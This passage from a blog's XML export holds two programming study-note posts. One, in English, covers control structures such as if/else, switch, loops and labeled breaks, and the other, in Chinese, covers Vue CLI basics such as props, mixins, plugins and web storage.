      <tags>
        <tag>Principles</tag>
      </tags>
  </entry>
  <entry>
    <title>Statement - Level Control Structures</title>
    <url>/myBlog/2023/04/26/2023/CSCI3180/2023-4-26-CSCI3180-Statement-Level-Control-Structures/</url>
    <content><![CDATA[<h2 id="Two-Way-Selection-Statements"><a href="#Two-Way-Selection-Statements" class="headerlink" title="Two-Way Selection Statements"></a>Two-Way Selection Statements</h2><ul>
<li><p>provides the means of choosing between two or more paths of execution</p>
</li>
<li><p>General Form:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> control-expression</span><br><span class="line">    <span class="comment">// then-clause</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="comment">// else-clause</span></span><br></pre></td></tr></table></figure>
<ul>
<li>the control expression must be <code>Boolean</code> in most of the languages</li>
<li>some other languages like <code>C</code> accepts numeric</li>
</ul>
</li>
<li><p>Clause Form:</p>
<ul>
<li>the then-clause and else-clause can be <font color="3A75EA">signle statement</font> or <font color="3A75EA">compound statements</font> in most of the languages</li>
<li>Perl only accepts <font color="3A75EA">compound statements</font></li>
<li>Python and Ruby: clauses are statement sequences</li>
</ul>
</li>
</ul>
<h3 id="Nesting-Selectors"><a href="#Nesting-Selectors" class="headerlink" title="Nesting Selectors"></a>Nesting Selectors</h3><ul>
<li><p><font color="F54747"><strong>Dangling else problem</strong></font></p>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> condition1 = <span class="literal">true</span>;</span><br><span class="line"><span class="type">bool</span> condition2 = <span class="literal">false</span>;</span><br><span class="line">string result = <span class="string">&quot;haha&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(condition1)</span><br><span class="line">    <span class="keyword">if</span>(condition2)</span><br><span class="line">        result = <span class="string">&quot;hehe&quot;</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    result = <span class="string">&quot;hoho&quot;</span>;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; result &lt;&lt; endl;  <span class="comment">// hoho</span></span><br></pre></td></tr></table></figure>
<ul>
<li>In C&#x2F;C++&#x2F;Java, <code>else</code> matches with the <font color="F54747">nearest previous</font> <code>if</code></li>
</ul>
</li>
<li><p>In Perl, this is actually enforced</p>
  <figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">$condition1 = true;</span><br><span class="line">$condition2 = false;</span><br><span class="line">$result = <span class="string">&quot;haha&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($condition1)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>($condition2)</span><br><span class="line">    &#123;</span><br><span class="line">        $result = <span class="string">&quot;hehe&quot;</span>;</span><br><span class="line">&#125; &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $result = <span class="string">&quot;hoho&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> $result;</span><br></pre></td></tr></table></figure>
</li>
<li><p>In some languages, clauses are statement sequences which are ended by a reserved word <code>end</code></p>
  <figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">condition1 = <span class="literal">true</span></span><br><span class="line">condition2 = <span class="literal">false</span></span><br><span class="line">result = <span class="string">&quot;haha&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> condition1 <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">if</span> condition2 <span class="keyword">then</span></span><br><span class="line">        result = <span class="string">&quot;hehe&quot;</span></span><br><span class="line">    <span class="keyword">end</span> </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    result = <span class="string">&quot;hoho&quot;</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
</li>
<li><p>In Python,</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">condition1 = <span class="literal">True</span></span><br><span class="line">condition2 = <span class="literal">False</span></span><br><span class="line">result = <span class="string">&quot;haha&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> condition1:</span><br><span class="line">    <span class="keyword">if</span> condition2:</span><br><span class="line">        result = <span class="string">&quot;hehe&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    result = <span class="string">&quot;hoho&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Multiple-Way-Selection"><a href="#Multiple-Way-Selection" class="headerlink" title="Multiple-Way Selection"></a>Multiple-Way Selection</h2><ul>
<li><p>allow the selection of one of any number of statements or statement groups</p>
</li>
<li><p>Switch statement in C, C++, and Java</p>
<ul>
<li><p>Control expression and case constants can only be <font color="3A75EA">integers</font></p>
</li>
<li><p><code>default</code> clause is for unrepresented values</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (expression) &#123;</span><br><span class="line">    <span class="keyword">case</span> const_expr_1:</span><br><span class="line">        statement_1;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">case</span> const_expr_n:</span><br><span class="line">        statement_n;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        statement_n+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Placement</strong></p>
<ul>
<li><code>switch-case</code> has no restructions on the placement of the case expression  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> x = <span class="number">37</span>;</span><br><span class="line"><span class="keyword">switch</span>(x)</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isPrime</span>(x))  <span class="comment">// skip the if statement</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>: <span class="keyword">case</span> <span class="number">3</span>: <span class="keyword">case</span> <span class="number">5</span>: <span class="keyword">case</span> <span class="number">7</span>: <span class="comment">// quick jump</span></span><br><span class="line">        <span class="built_in">processPrime</span>(x);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>: <span class="keyword">case</span> <span class="number">6</span>: <span class="keyword">case</span> <span class="number">8</span>: <span class="keyword">case</span> <span class="number">9</span>: <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">        <span class="built_in">processComposite</span>(x);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
<li><p>unconditional branch in C#</p>
<ul>
<li>C# allows unconditional branch like <code>goto</code> and <code>break</code>  <figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span> <span class="keyword">value</span> = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">int</span> result = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">switch</span>(<span class="keyword">value</span>)&#123;</span><br><span class="line"><span class="keyword">case</span> &lt; <span class="number">0</span>:</span><br><span class="line">    result += <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">    result += <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">goto</span> <span class="keyword">case</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    result += <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="literal">default</span>:</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Multiple Selector in two-way selectors:</p>
<ul>
<li><p>the connection of two-way selections using <code>else if</code></p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> n = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;one&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">2</span>)&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;two&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">3</span>)&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;three&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>but the structure is more look like this (which is <font color="3A75EA">not an actual multiple-way selection</font>)</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> n = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;one&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n == <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;two&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">3</span>)&#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;three&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>In Python, <code>elif</code> is a single special keyword and enables <font color="F54747"><strong>actual multiple-way selection</strong></font></p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;one&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> n == <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;two&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> n == <span class="number">3</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;three&quot;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>Implementation</strong></p>
<ul>
<li>General approach<ul>
<li>multiple conditional branches</li>
<li>linear search of a simple table of case values</li>
</ul>
</li>
<li>Optimized approaches<ul>
<li>array</li>
<li>hash table</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="Counter-Controlled-Loops"><a href="#Counter-Controlled-Loops" class="headerlink" title="Counter-Controlled Loops"></a>Counter-Controlled Loops</h2><ul>
<li>has a loop variable, and a means of specifying the initial, condition, and step</li>
<li>C-based language Syntax: <code>for ([initial] ; [condition] ; [step]) body</code><ul>
<li><p>the <code>[initial]</code>, <code>[condition]</code> and <code>[step]</code> can be whole statements or even statement sequences(statement seperated by <code>,</code>)</p>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++, j += <span class="number">2</span>)&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;loop &quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; j &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>It can even has no statements</p>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;)&#123;   <span class="comment">// while(true)</span></span><br><span class="line">    <span class="comment">// body</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (;A;)&#123;  <span class="comment">// while(A)</span></span><br><span class="line">    <span class="comment">// body</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>It is legal for C++ to go back to the loop body using <code>goto</code></p>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    print:</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;loop &quot;</span> &lt;&lt; i &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;one more time?&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="type">char</span> input;</span><br><span class="line">cin &gt;&gt; input;</span><br><span class="line"><span class="keyword">if</span> (input == <span class="string">&#x27;y&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">goto</span> print;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="Logic-Driven-Loops"><a href="#Logic-Driven-Loops" class="headerlink" title="Logic-Driven Loops"></a>Logic-Driven Loops</h2><ul>
<li><p>the repetition control is based on a Boolean expression</p>
</li>
<li><p><font color="F54747"><strong>Pretest Loop</strong></font></p>
<ul>
<li>check the loop condition before the first iteration</li>
<li><code>while</code> loop  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (control_expression) &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><font color="F54747"><strong>Posttest Loop</strong></font></p>
<ul>
<li>check the loop condition after the first iteration</li>
<li><code>do-while</code> loop  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125; <span class="keyword">while</span> (control_expression)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>It is also legal for C++ to go back to the loop body using <code>goto</code></p>
</li>
</ul>
<h2 id="Data-Structure-Based-Loops"><a href="#Data-Structure-Based-Loops" class="headerlink" title="Data-Structure-Based Loops"></a>Data-Structure-Based Loops</h2><ul>
<li><p>the number of elements in a data structure controls loop iteration</p>
</li>
<li><p>call to an <font color="3A75EA">iterator function</font> or a <font color="3A75EA">callable object</font> that returns the next element in some chosen order, if there is one; else loop is terminated</p>
</li>
<li><p>Implement using pointer in C</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (node* p=root; p!=<span class="literal">NULL</span>; traverse(p))&#123;</span><br><span class="line">    <span class="comment">// use *p to access the current element</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Standard Template Library</strong> in C++</p>
<ul>
<li>instead of dealing with pointer, STL iterators can simply using the deference operator <code>*</code> and increment operators <code>++</code>  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (vector&lt;<span class="type">int</span>&gt;::iterator p=v.<span class="built_in">begin</span>(); p!=v.<span class="built_in">end</span>(); p++) &#123;</span><br><span class="line">    <span class="comment">// use *p to access the current element</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Java Implementation</p>
<ul>
<li><p>the class that implements the Iterable interface (<code>ArrayList</code>)</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (String myElement : myList)&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>forEach</code> method</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">myList.forEach((n) -&gt; &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Python Implementation</p>
<ul>
<li><p>The loop variable takes on the values specified in the given sequence</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> loop_variable <span class="keyword">in</span> sequence:</span><br><span class="line">    <span class="comment"># loop_body</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>else clause is execute if the loop terminates normally</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pets = [<span class="string">&quot;kitty&quot;</span>, <span class="string">&quot;doggy&quot;</span>, <span class="string">&quot;pig&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> pet <span class="keyword">in</span> pets:</span><br><span class="line">    <span class="keyword">if</span> pet == <span class="string">&quot;piggy&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;piggy is found!&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:   <span class="comment"># if the loop terminates normally</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;no piggy&quot;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>similate counter-controlled loop</strong></p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="User-Located-Loop-Control-Mechanisms"><a href="#User-Located-Loop-Control-Mechanisms" class="headerlink" title="User-Located Loop Control Mechanisms"></a>User-Located Loop Control Mechanisms</h2><ol>
<li><p>unconditional unlabeled exits (<code>break</code> in most of the languages, <code>last</code> in Perl)</p>
<ul>
<li>exit the loop</li>
</ul>
</li>
<li><p>unlabeled control statement (<code>continue</code>)</p>
<ul>
<li>skips the the remainder of the current iteration, <font color="3A75EA">but does not exit the loop</font></li>
</ul>
</li>
<li><p>Labeled exits</p>
<ul>
<li>consider the <code>break</code> can only exist for the current loop but cannot exit the outer loop</li>
<li>we can label the outer loop and then use <code>break label;</code> to exit the outer loop  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">outerLoop:</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">5</span>; j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i + j == <span class="number">5</span>)&#123;</span><br><span class="line">            System.out.println(i + <span class="string">&quot; &quot;</span> + j);</span><br><span class="line">            <span class="keyword">break</span> outerLoop;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>If <code>goto</code> is legal, then simply use <code>goto</code> to exit the outer loop</li>
</ul>
</li>
</ol>
<!-- 
<font color="3A75EA">Blue</font>
<font color="F54747">Red</font>
-->
]]></content>
      <categories>
        <category>CSCI3180</category>
      </categories>
  </entry>
  <entry>
    <title>VueJS - Vue CLI</title>
    <url>/myBlog/2022/06/19/2022/FrontEnd/2022-6-19-VueJS-cli/</url>
    <content><![CDATA[<h1 id="Vue-CLI"><a href="#Vue-CLI" class="headerlink" title="Vue CLI"></a>Vue CLI</h1><h2 id="腳手架的文件結構"><a href="#腳手架的文件結構" class="headerlink" title="腳手架的文件結構"></a>腳手架的文件結構</h2><pre><code>|—— node_modules
|—— public
|     |—— favicon.ico 頁籤圖標
|     |—— index.html 主頁面
|
|—— src
|    |—— assets 存放靜態資源
|    |     |—— logo.png
|    |
|    |—— components 存放組件
|    |        |—— HelloWorld.vue
|    |
|    |—— App.vue 匯總所有組件
|    |—— main.js 入口文件
|
|—— .gitignore git版本管制忽略的配置
|—— babel.config.js babel的配置文件
|—— package.json 應用包配置文件
|—— README.md 應用描述文件
|—— package-lock.json 包版本控制文件
</code></pre>
<h2 id="vue-config-js-配置文件"><a href="#vue-config-js-配置文件" class="headerlink" title="vue.config.js 配置文件"></a>vue.config.js 配置文件</h2><p>使用<code>vue inspect</code> &gt; <code>output.js</code>可以查看到Vue腳手架的默認配置<br>使用<code>vue.config.js</code> 可以對腳手架進行個性化定制</p>
<h2 id="ref屬性"><a href="#ref屬性" class="headerlink" title="ref屬性"></a>ref屬性</h2><ol>
<li><p>被用來給 元素 或 子組件 註冊引用信息（id的替代者）</p>
</li>
<li><p>應用在html標籤上獲取的是<font color="#f54747">真實DOM元素</font><br>應用在組件標籤上則是<font color="#f54747">組件的實例對象(vc)</font></p>
</li>
<li><p>使用方式：</p>
<ul>
<li>標識：<code>&lt;h1 ref=&quot;xxx&quot;&gt;&lt;/h1&gt;</code> 或 <code>&lt;School ref=&quot;xxx&quot;&gt;&lt;/School&gt;</code></li>
<li>獲取：<code>this.$refs.xxx</code></li>
</ul>
</li>
</ol>
<h2 id="混入mixin"><a href="#混入mixin" class="headerlink" title="混入mixin"></a>混入mixin</h2><ol>
<li><p>功能：可以把多個組件共同的配置提取成一個混入對象</p>
</li>
<li><p>使用方式：</p>
<ol>
<li><p>定義：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> xxx&#123;</span><br><span class="line">    <span class="title function_">data</span>(<span class="params"></span>)&#123;...&#125;</span><br><span class="line">    <span class="attr">methods</span>:&#123;...&#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>使用：</p>
<ol>
<li><p>全局混入：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Vue</span>.<span class="title function_">mixin</span>(xxx)</span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">mixin</span>(yyy)</span><br></pre></td></tr></table></figure>
</li>
<li><p>局部混入：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">mixins</span>:[<span class="string">&#x27;xxx&#x27;</span>, <span class="string">&#x27;yyy&#x27;</span>]</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>備註：</p>
<ul>
<li>如果混入的屬性與函數和組件裡的重名，則使用組件的屬性與函數</li>
<li>如果混入的是組件函數，則都會執行，例如：<code>mounted()</code></li>
</ul>
</li>
</ol>
</li>
</ol>
<h2 id="插件plugins"><a href="#插件plugins" class="headerlink" title="插件plugins"></a>插件plugins</h2><ol>
<li><p>功能：用於增強Vue</p>
</li>
<li><p>本質：包含<code>install(Vue, options)</code>方法的一個對象<br> 第一個參數：Vue<br> 第二個以後的參數：插件使用者傳遞的數據</p>
</li>
<li><p>定義插件：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">obj.<span class="property">install</span> = <span class="keyword">function</span>(<span class="params">Vue, options</span>)&#123;...&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用插件：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(xxx)</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="scoped樣式"><a href="#scoped樣式" class="headerlink" title="scoped樣式"></a>scoped樣式</h2><ol>
<li><p>作用：讓樣式在局部生效，防止衝突</p>
</li>
<li><p>寫法：<code>&lt;style scoped&gt;</code></p>
</li>
<li><p>具體代碼；</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;style scoped lang=&quot;less&quot;&gt;</span><br><span class="line">    .demo&#123;</span><br><span class="line">        background-color: orange;</span><br><span class="line">        color: aqua;</span><br><span class="line">        .less_test&#123;</span><br><span class="line">            font-size: 40px;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="配置項props"><a href="#配置項props" class="headerlink" title="配置項props"></a>配置項props</h2><ol>
<li><p>功能：讓組件接受外部傳進來的數據</p>
</li>
<li><p>傳遞數據：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Demo :name=&quot;xxx&quot;/&gt;</span><br></pre></td></tr></table></figure>

</li>
<li><p>接收數據：</p>
<ol>
<li><p>只接收</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">props[<span class="string">&#x27;name&#x27;</span>]</span><br></pre></td></tr></table></figure>
</li>
<li><p>限制類型</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">props</span>:&#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="title class_">String</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>限制類型、限制必要性、指定默認值</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">props</span>:&#123;</span><br><span class="line">    <span class="attr">name</span>:&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="title class_">String</span>     <span class="comment">// 類型</span></span><br><span class="line">        <span class="attr">required</span>: <span class="literal">true</span>   <span class="comment">// 必要性</span></span><br><span class="line">        <span class="attr">default</span>: <span class="string">&#x27;yyy&#x27;</span>   <span class="comment">// 默認值</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>備註：</p>
<ul>
<li><code>props</code>是<font color="#f54747">只讀</font>的，Vue底層會監測對<code>props</code>的修改，如果進行了修改，會發出警告</li>
<li>若必須修改傳入數據，那麼可以複製<code>props</code>的內容到<code>data</code>中，去修改<code>data</code>中的數據</li>
<li><code>props</code>傳過來的若是對象類型的值，修改對象中的屬性時Vue不會報錯，但不推薦這麼做</li>
</ul>
</li>
</ol>
<h3 id="props實現組件間通信"><a href="#props實現組件間通信" class="headerlink" title="props實現組件間通信"></a>props實現組件間通信</h3><ol>
<li><p>父組件 -&gt; 子組件</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 父組件 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;School name=&quot;xxx&quot; :age=&quot;19&quot;/&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 子組件 --&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    props:[&#x27;name&#x27;, &#x27;age&#x27;]</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

</li>
<li><p>子組件 -&gt; 父組件</p>
<ul>
<li>思路：由於<code>props</code>只能父組件給子組件，因此父組件可以給子組件一個函數，在傳遞時子組件調用該函數 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 父組件 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;h1&gt;Hello World, &#123;&#123;name&#125;&#125;&lt;/h1&gt;</span><br><span class="line">        &lt;!-- 父給子一個函數 --&gt;</span><br><span class="line">        &lt;Demo :changeNameFunction=&quot;changeNameFunction&quot;/&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    data()&#123;</span><br><span class="line">        return &#123;</span><br><span class="line">            name:&#x27;&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">        // 修改數據</span><br><span class="line">        changeNameFunction(name)&#123;</span><br><span class="line">            this.name = name</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 子組件 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; v-model=&quot;name&quot;&gt;</span><br><span class="line">        &lt;button @click=&quot;changeName&quot;&gt;Click&lt;/button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    props:[&#x27;changeNameFunction&#x27;],</span><br><span class="line">    data() &#123;</span><br><span class="line">        return &#123;</span><br><span class="line">            name:&#x27;&#x27;,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">        changeName()&#123;</span><br><span class="line">            // 要修改數據時，調用父組件的方法，並通過參數傳遞數據</span><br><span class="line">            this.changeNameFunction(this.name)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="瀏覽器本地存儲webStorage"><a href="#瀏覽器本地存儲webStorage" class="headerlink" title="瀏覽器本地存儲webStorage"></a>瀏覽器本地存儲webStorage</h2><ol>
<li><p>儲存內容大小一般支持5MB左右</p>
</li>
<li><p>瀏覽器通過<code>Window.sessionStorage</code> 和 <code>Window.localStorage</code> 屬性來實現本地儲存機制</p>
</li>
<li><p>相關API：</p>
<ol>
<li><p><code>xxxxxStorage.setItem(&#39;key&#39;, &#39;value&#39;)</code></p>
<ul>
<li>該方法接收一個鍵和值為參數，會把鍵值添加到儲存中，如果鍵名存在，則更新其對應的值</li>
<li>儲存的value統一變更為字符串：<ul>
<li>因此可以使用<code>JSON.stringify()</code>將對象以字符串形式保存</li>
<li>再以<code>JSON.parse()</code>的方式將字符串轉變為對象</li>
</ul>
</li>
</ul>
</li>
<li><p><code>xxxxxStorage.getItem(&#39;key&#39;)</code></p>
<ul>
<li>該方法接收一個鍵名作為參數，返回鍵名對應的值</li>
</ul>
</li>
